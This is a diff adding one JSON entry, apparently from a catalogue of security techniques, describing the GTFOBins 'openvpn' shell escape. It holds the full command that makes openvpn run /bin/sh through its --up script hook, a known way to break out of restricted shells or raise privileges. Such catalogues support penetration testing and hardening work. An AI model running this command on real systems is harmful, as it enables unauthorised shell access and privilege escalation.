@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-openvpn-shell",
+  "name": "GTFOBins · openvpn (shell)",
+  "command": "openvpn --dev null --script-security 2 --up '/bin/sh -s'",
+  "description": "Use openvpn to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "openvpn",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/openvpn/#shell",
+  "upstream_id": "openvpn/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/openvpn/"
+    }
+  ]
+}
